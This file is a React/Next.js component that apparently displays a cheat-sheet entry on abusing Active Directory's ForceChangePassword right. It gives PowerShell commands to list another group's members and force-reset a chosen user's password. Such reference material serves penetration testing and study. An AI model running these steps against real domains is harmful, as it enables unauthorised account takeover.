import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import Image from "next/image";

interface IProps {
  title: string;
}

const ForceChangePassword = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              The members of the compromised group have the capability to change
              the user's password in the other group without knowing that user's
              current password.
            </Typography>
            <Image
              src="/ForceChangePassword.png"
              width={575}
              height={154}
              priority={true}
            />
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>
              Get a list of user's in the other group so we can choose which
              user we want to change the password of.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {'Get-ADGroupMember -Identity "OTHER_GROUP_NAME"'}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>Create a new password variable.</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                '$Password = ConvertTo-SecureString "Password123!" -AsPlainText -Force'
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>
              Change one of the user's passwords to the password you created.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                'Set-ADAccountPassword -Identity "ACCOUNT" -Reset -NewPassword $Password'
              }
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default ForceChangePassword;
